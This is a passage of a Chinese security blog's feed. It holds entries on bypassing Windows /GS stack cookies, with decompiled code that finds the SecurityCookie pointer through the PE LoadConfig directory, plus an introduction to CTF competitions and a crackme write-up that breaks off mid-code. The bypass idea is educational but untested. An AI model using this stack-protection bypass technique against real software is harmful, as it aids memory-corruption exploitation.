      &lt;p&gt;&lt;strong&gt;1. 丘比龙的最爱&lt;/strong&gt;&lt;br&gt;传说，丘比龙是丘比特的弟弟，丘比龙是一只小爱神，虽然有两只翅膀，但因为吃多了，导致身体太胖，所以飞不起来~那么问题来了?!丘比龙吃什么食物吃多了变胖了&lt;br&gt;百度之：甜甜圈&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="hctf" scheme="http://anhkgg.github.io/tags/hctf/"/>
    
  </entry>
  
  <entry>
    <title>how to get GS cookie</title>
    <link href="http://anhkgg.github.io/how-to-get-GS-cookie/"/>
    <id>http://anhkgg.github.io/how-to-get-GS-cookie/</id>
    <published>2014-11-05T03:32:29.000Z</published>
    <updated>2016-07-07T04:33:15.101Z</updated>
    
    <content type="html">&lt;h1 id=&quot;Stack-cookie&quot;&gt;&lt;a href=&quot;#Stack-cookie&quot; class=&quot;headerlink&quot; title=&quot;Stack cookie&quot;&gt;&lt;/a&gt;&lt;strong&gt;Stack cookie&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;Stack cookies (/GS Switch cookie)，windows防止栈溢出的一种机制，&lt;a href=&quot;http://www.pediy.com/kssd/pediy12/102719/724039/39112.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;详见&lt;/a&gt;。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;栈中的 cookie/GS保护&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;/GS 编译选项会在函数的开头和结尾添加代码来阻止对典型的栈溢出漏洞（字符串缓冲区）的利用。&lt;br&gt;当应用程序启动时，程序的 cookie（4 字节（dword），无符号整型）被计算出来（伪随机数）并保存在&lt;br&gt;加载模块的.data 节中,在函数的开头这个 cookie 被拷贝到栈中，位于 EBP 和返回地址的正前方（位于返&lt;br&gt;回地址和局部变量的中间）。&lt;br&gt;[buffer][cookie][saved EBP][saved EIP]&lt;br&gt;在函数的结尾处，程序会把这个 cookie 和保存在.data 节中的 cookie 进行比较。&lt;br&gt;如果不相等，就说明进程栈被破坏，进程必须被终止。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;栈中的 cookie/GS绕过方法&lt;/strong&gt;&lt;br&gt;挫败这种栈溢出保护机制的最直接的方法是检索/猜测/计算出 cookie 值（这样就可以用相同的 cookie&lt;br&gt;覆盖栈中的 cookie），这个 cookie 有时候（很少）是一个静态值…但即使如此，它也可能包含一些不利&lt;br&gt;的字符而导致不能使用它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;如何通过PE来获取GS-cookie的值&quot;&gt;&lt;a href=&quot;#如何通过PE来获取GS-cookie的值&quot; class=&quot;headerlink&quot; title=&quot;如何通过PE来获取GS cookie的值&quot;&gt;&lt;/a&gt;&lt;strong&gt;如何通过PE来获取GS cookie的值&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;在PE的DataDirectory中，第10序号的是一个叫做LoadConfig的东西，保存了映像的配置数据，里面就有GS cookie，来看看这个数据结构&lt;br&gt;&lt;a href=&quot;http://msdn.microsoft.com/en-us/library/windows/desktop/ms680328(v=vs.85).aspx&quot; title=&quot;loadconfig&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;IMAGE_LOAD_CONFIG_DIRECTORY32&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;typedef struct &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   Size;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   TimeDateStamp;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WORD    MajorVersion;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WORD    MinorVersion;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   GlobalFlagsClear;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   GlobalFlagsSet;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   CriticalSectionDefaultTimeout;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   DeCommitFreeBlockThreshold;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   DeCommitTotalFreeThreshold;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   LockPrefixTable;            // VA&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   MaximumAllocationSize;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   VirtualMemoryThreshold;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   ProcessHeapFlags;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   ProcessAffinityMask;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WORD    CSDVersion;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WORD    Reserved1;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   EditList;                   // VA&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   SecurityCookie;             // VA&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   SEHandlerTable;             // VA&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DWORD   SEHandlerCount;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125; IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;SecurityCookie&lt;/strong&gt;&lt;br&gt;A pointer to a cookie that is used by Visual C++ or GS implementation.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以，可以通过解析pe的方式，获取到SecurityCookie，进而绕过cookie/GS保护，这只是我的想法，也没测试过，是在分析某个sys的时间想到的，下面贴出获取Cookie的代码&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;unsigned int __stdcall myGetGSSecureCookie(PVOID ImageBase, ULONG Size)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  ULONG v2; // edi@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  PVOID v3; // esi@1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  PVOID v4; // eax@2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  unsigned int result; // eax@7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v3 = ImageBase;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  v2 = Size;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  if ( (signed int)myGetValidNtHeader(1, (unsigned int)ImageBase, Size, (int)&amp;amp;ImageBase) &amp;lt; 0//myGetValidNtHeader获取nt头地址&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    || (v4 = RtlImageDirectoryEntryToData(v3, 1u, 0xAu, &amp;amp;Size), !v4)// 通过加载配置目录信息找到SecureCookie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    || !Size&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    || Size != 0x40 &amp;amp;&amp;amp; Size != *(_DWORD *)v4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    || *(_DWORD *)v4 &amp;lt; 0x48u&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    || (result = *((_DWORD *)v4 + 15), result &amp;lt;= (unsigned int)v3)// loadcofig-&amp;gt;SecurityCookie&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;						// A pointer to a cookie that is used by Visual C++ or GS implementation.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    || result &amp;gt;= (unsigned int)(v3 + v2 - 4) )&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    result = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  return result;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&quot;其他&quot;&gt;&lt;a href=&quot;#其他&quot; class=&quot;headerlink&quot; title=&quot;其他&quot;&gt;&lt;/a&gt;&lt;strong&gt;其他&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;没来得及查资料，是否有完整的绕过方法，这只是自己突然分析到这，想到的，不对之处，敬请见谅。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Stack-cookie&quot;&gt;&lt;a href=&quot;#Stack-cookie&quot; class=&quot;headerlink&quot; title=&quot;Stack cookie&quot;&gt;&lt;/a&gt;&lt;strong&gt;Stack cookie&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;Stack cookies (/GS Switch cookie)，windows防止栈溢出的一种机制，&lt;a href=&quot;http://www.pediy.com/kssd/pediy12/102719/724039/39112.pdf&quot;&gt;详见&lt;/a&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://anhkgg.github.io/categories/security/"/>
    
    
      <category term="PE" scheme="http://anhkgg.github.io/tags/PE/"/>
    
      <category term="GS" scheme="http://anhkgg.github.io/tags/GS/"/>
    
      <category term="cookie" scheme="http://anhkgg.github.io/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>ctf认识</title>
    <link href="http://anhkgg.github.io/known-ctf/"/>
    <id>http://anhkgg.github.io/known-ctf/</id>
    <published>2014-11-04T07:08:11.000Z</published>
    <updated>2016-07-07T04:35:08.046Z</updated>
    
    <content type="html">&lt;h1 id=&quot;CTF-meaning&quot;&gt;&lt;a href=&quot;#CTF-meaning&quot; class=&quot;headerlink&quot; title=&quot;CTF meaning&quot;&gt;&lt;/a&gt;&lt;strong&gt;CTF meaning&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.csdn.net/article/2013-01-04/2813390-hackers-confs-comparison&quot; title=&quot;ctf meaning&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CTF&lt;/a&gt;: 全称Capture The Flag， 就是夺旗比赛，衍生自古代军事战争模式，两队人马前往对方基地夺旗，每队人马须在保护好己方旗帜的情况下将对方旗帜带回基地。在计算机安全领域，CTF是一种&lt;a href=&quot;http://en.wikipedia.org/wiki/Capture_the_flag&quot; title=&quot;computer security&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;计算机安全竞赛&lt;/a&gt;。&lt;br&gt;CTF通常有两种形式，&lt;a href=&quot;http://bctf.cn/faq&quot; title=&quot;ctf mode&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解题模式&lt;/a&gt;（Jeopardy）和&lt;a href=&quot;http://bctf.cn/faq&quot; title=&quot;ctf mode&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;攻防模式&lt;/a&gt;（Attack-Defense）, 在解题模式的比赛中，主办方会提供一系列不同类型的赛题，比如上线一个有漏洞的服务、提供一段网络流量、给出一个加密后的数据或经过隐写后的文件等，他们将 flag 隐藏在这些赛题中，选手们通过比拼解题来一决高下；在攻防模式比赛中，主办方会事先编写一系列有漏洞的服务，并将它们安装在每个参赛队伍都相同的环境中，参赛队伍一方面需要修补自己服务的漏洞，同时也需要去攻击对手们的服务、拿到对手环境中的 flag 来得分，攻防模式的竞赛往往比解题模式的竞赛更接近真实环境，比赛过程也更加激烈。 一般资格赛采用解题模式，决赛采用攻防模式。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CTF-content&quot;&gt;&lt;a href=&quot;#CTF-content&quot; class=&quot;headerlink&quot; title=&quot;CTF content&quot;&gt;&lt;/a&gt;&lt;strong&gt;CTF content&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;CTF包含题目较广，有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;逆向工程&lt;/li&gt;
&lt;li&gt;密码学 &lt;/li&gt;
&lt;li&gt;ACM编程 &lt;/li&gt;
&lt;li&gt;web漏洞 &lt;/li&gt;
&lt;li&gt;二进制练习 &lt;/li&gt;
&lt;li&gt;网络和取证&lt;/li&gt;
&lt;li&gt;隐写术 &lt;/li&gt;
&lt;li&gt;无线安全&lt;br&gt;等等。需要深入研究某几个方向，涉及其他方向的知识。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;CTF-matchs&quot;&gt;&lt;a href=&quot;#CTF-matchs&quot; class=&quot;headerlink&quot; title=&quot;CTF matchs&quot;&gt;&lt;/a&gt;&lt;strong&gt;CTF matchs&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;国际赛比较有名的比赛：&lt;br&gt;&lt;a href=&quot;http://hitcon.org/2014/CTF/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;DEFCON CTF&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://legitbs.net/2014&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HITCON CTF&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;国内较有名气的信息安全比赛有：&lt;br&gt;&lt;a href=&quot;http://iscc.org.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ISCC ctf&lt;/a&gt;&lt;br&gt;2011年上海市信息安全技能竞赛&lt;br&gt;全国大学生信息安全竞赛&lt;br&gt;四川省大学生信息安全技术大赛&lt;br&gt;全国大学生网络安全实战竞赛&lt;br&gt;江西高校信息安全知识及软件设计大赛&lt;br&gt;绿盟科技杯-信息安全对抗技术竞赛&lt;br&gt;XCon安全焦点信息安全技术峰会&lt;/p&gt;
&lt;p&gt;以及目前各网络公司组办的ctf比赛，如&lt;a href=&quot;http://alictf.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;alictf&lt;/a&gt;, &lt;a href=&quot;http://bctf.cn/faq&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;bctf&lt;/a&gt;, &lt;a href=&quot;http://is.campus.360.cn/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;360信息安全技术大赛&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;CTF-starting&quot;&gt;&lt;a href=&quot;#CTF-starting&quot; class=&quot;headerlink&quot; title=&quot;CTF starting&quot;&gt;&lt;/a&gt;&lt;strong&gt;&lt;a href=&quot;http://www.freebuf.com/articles/others-articles/36927.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CTF starting&lt;/a&gt;&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;各个方向学习参考(ctrl+c+v)：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;逆向工程。我强烈建议你得到一个IDA Pro的副本，这有免费版和学生认证书。尝试下crack me的问题。写出你的C语言代码，然后进行反编译。重复这个过程，同时更改编译器的选项和程序逻辑。在编译的二进制文件中“if”声明和“select”语句有什么不同？我建议你专注于一个单一的原始架构：x86、x86_64或是ARM。在处理器手册中查找你要找的，参考有：&lt;br&gt;《Practical Reverse Engineering》&lt;br&gt;《Reversing: Secrets of Reverse Engineering》&lt;br&gt;《The IDA Pro Book》&lt;/li&gt;
&lt;li&gt;加密。虽然这不是我自己的强项，但这里有一些参考还是要看看的：&lt;br&gt;《Applied Cryptography》&lt;br&gt;《Practical Cryptography》&lt;br&gt;Cryptography I&lt;/li&gt;
&lt;li&gt;ACM编程。选择一个高层次的语言，我推荐使用Python或Ruby。对于Python而言，阅读下《Dive into Python》和找一些你要加入的项目。值得一提的是Metasploit是用Ruby编写的。关于算法和数据结构的计算机科学课也要在此类中要走很长的路。看看来自CTF和其他编程的挑战，战胜他们。专注于创建一个解决方法而不是最快或是最好的方法，特别是在你刚刚开始的时候。&lt;/li&gt;
&lt;li&gt;web漏洞。有很多的网络编程技术，在CTF中最流行的就是PHP和SQL。php.net网站（译者注：需翻墙）是一个梦幻的语言参考，只要搜索你好奇的功能。PHP之后，看到网页上存在的挑战的最常见的方法就是使用Python或Ruby脚本。主要到技术有重叠，这有一本关于网络安全漏洞的好书，是《黑客攻防技术宝典：Web实战篇》。除此之外，在学习了一些基本技术之后，你可能也想通过比较流行的免费软件工具来取得一些经验。这些在CTF竞争中也可能会偶尔用到，这些加密会和你凭经验得到的加密重叠。&lt;/li&gt;
&lt;li&gt;二进制练习。这是我个人的爱好，我建议你在进入二进制练习前要完成逆向工程的学习。这有几个你可以独立学习的常见类型漏洞：栈溢出，堆溢出，对于初学者的格式字符串漏洞。很多是通过练习思维来辨别漏洞的类型。学习以往的漏洞是进入二进制门槛的最好途径。推荐你可以阅读：&lt;br&gt;《黑客：漏洞发掘的艺术》&lt;br&gt;《黑客攻防技术宝典：系统实战篇》&lt;br&gt;《The Art of Software Security Assessment》&lt;/li&gt;
&lt;li&gt;取证/网络。大多数的CTF团队往往有“一个”负责取证的人。我不是那种人，但是我建议你学习如何使用010 hex editor，不要怕做出荒谬、疯狂、随机的猜测这些问题运行的结果是怎样。&lt;br&gt;最后，Dan Guido和公司最近推出了CTF领域指南，会对以上几个主题的介绍有很好的帮助。&lt;/li&gt;
&lt;li&gt;其他&lt;br&gt;&lt;a href=&quot;http://smashthestack.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Smash the Stack&lt;/a&gt;（漏洞利用）&lt;br&gt;&lt;a href=&quot;http://crackmes.de/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Crackmes.de&lt;/a&gt;（逆向工程）&lt;br&gt;&lt;a href=&quot;http://netforce.nl/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Netforce.nl&lt;/a&gt;（web渗透与密码学）&lt;br&gt;另外，BCTF赛题会与国际CTF比赛接轨，因此可以报名参加国际CTF比赛（详情参考&lt;a href=&quot;http://ctftime.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ctftime&lt;/a&gt;）进行练手，也可以随时练习往届CTF赛题（&lt;a href=&quot;http://repo.shell-storm.org/CTF/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;赛题集合&lt;/a&gt;）。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;CTF-stars&quot;&gt;&lt;a href=&quot;#CTF-stars&quot; class=&quot;headerlink&quot; title=&quot;CTF stars&quot;&gt;&lt;/a&gt;&lt;strong&gt;CTF stars&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;国内ctf赛棍：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HITCON&lt;br&gt;被称为”新台湾之光”， 2014年DEFCON 22 CTF中，取得世界第二的成绩。&lt;/li&gt;
&lt;li&gt;Blue-Lotus&lt;br&gt;蓝莲花（blue-lotus）战队成立于清华大学网络与信息安全实验室，主要从事计算机安全攻防方面的研究。 多数主要成员为清华大学在读研究生，后吸纳包括来自浙江大学、上海交大、青岛理工、中国海洋大学、杭州电子科大等高校的多名学生， 以及若干绿盟、阿里巴巴等公司的年轻安全技术人员。在业余时间，团队组队参加多项国际知名CTF赛事， 曾作为中国的团队首次闯入全球顶级的DEFCON CTF总决赛。这里可以看到blue-lotus在各项国际CTF赛事中取得的所有成绩。&lt;/li&gt;
&lt;li&gt;其他&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CTF-meaning&quot;&gt;&lt;a href=&quot;#CTF-meaning&quot; class=&quot;headerlink&quot; title=&quot;CTF meaning&quot;&gt;&lt;/a&gt;&lt;strong&gt;CTF meaning&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.csdn.net/article/2013-01-04/2813390-hackers-confs-comparison&quot; title=&quot;ctf meaning&quot;&gt;CTF&lt;/a&gt;: 全称Capture The Flag， 就是夺旗比赛，衍生自古代军事战争模式，两队人马前往对方基地夺旗，每队人马须在保护好己方旗帜的情况下将对方旗帜带回基地。在计算机安全领域，CTF是一种&lt;a href=&quot;http://en.wikipedia.org/wiki/Capture_the_flag&quot; title=&quot;computer security&quot;&gt;计算机安全竞赛&lt;/a&gt;。&lt;br&gt;CTF通常有两种形式，&lt;a href=&quot;http://bctf.cn/faq&quot; title=&quot;ctf mode&quot;&gt;解题模式&lt;/a&gt;（Jeopardy）和&lt;a href=&quot;http://bctf.cn/faq&quot; title=&quot;ctf mode&quot;&gt;攻防模式&lt;/a&gt;（Attack-Defense）, 在解题模式的比赛中，主办方会提供一系列不同类型的赛题，比如上线一个有漏洞的服务、提供一段网络流量、给出一个加密后的数据或经过隐写后的文件等，他们将 flag 隐藏在这些赛题中，选手们通过比拼解题来一决高下；在攻防模式比赛中，主办方会事先编写一系列有漏洞的服务，并将它们安装在每个参赛队伍都相同的环境中，参赛队伍一方面需要修补自己服务的漏洞，同时也需要去攻击对手们的服务、拿到对手环境中的 flag 来得分，攻防模式的竞赛往往比解题模式的竞赛更接近真实环境，比赛过程也更加激烈。 一般资格赛采用解题模式，决赛采用攻防模式。&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://anhkgg.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://anhkgg.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ssctf crack5详述</title>
    <link href="http://anhkgg.github.io/ssctf-crack5-study/"/>
    <id>http://anhkgg.github.io/ssctf-crack5-study/</id>
    <published>2014-11-04T02:13:37.000Z</published>
    <updated>2016-07-07T04:35:06.621Z</updated>
    
    <content type="html">&lt;h2 id=&quot;crack5中的坑&quot;&gt;&lt;a href=&quot;#crack5中的坑&quot; class=&quot;headerlink&quot; title=&quot;crack5中的坑&quot;&gt;&lt;/a&gt;&lt;strong&gt;crack5中的坑&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;注册验证函数中，各种int 3，致使进入通过SetUnhandledExceptionFilter设置的异常处理函数TopLevelExceptionFilter，在TopLevelExceptionFilter控制验证函数中的执行流程，由于先前我用的win7 x64调试，注册毫无反应，以为验证函数无法正常完整执行，so手工乱恢复，看了writeup之后，在xp中调试，你妹，居然可以正常执行…这是坑吗&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;某两大神writeup中的解题思路&quot;&gt;&lt;a href=&quot;#某两大神writeup中的解题思路&quot; class=&quot;headerlink&quot; title=&quot;某两大神writeup中的解题思路&quot;&gt;&lt;/a&gt;&lt;strong&gt;某两大神writeup中的解题思路&lt;/strong&gt;&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;geek710 FROM SSEg33k&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在TopLevelExceptionFilter亦有花，geek710大神的想法是，走一遍TopLevelExceptionFilter，去除功能代码，然后再要跳去执行验证函数的位置，nop验证函数中所有花，这样，一次执行完整之后，就可以得到无花的验证函数，beautiful，跟着这个思想走了一下，不晓得那弄错了，每次都异常退出，下面是提取的TopLevelExceptionFilter的大致代码：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div 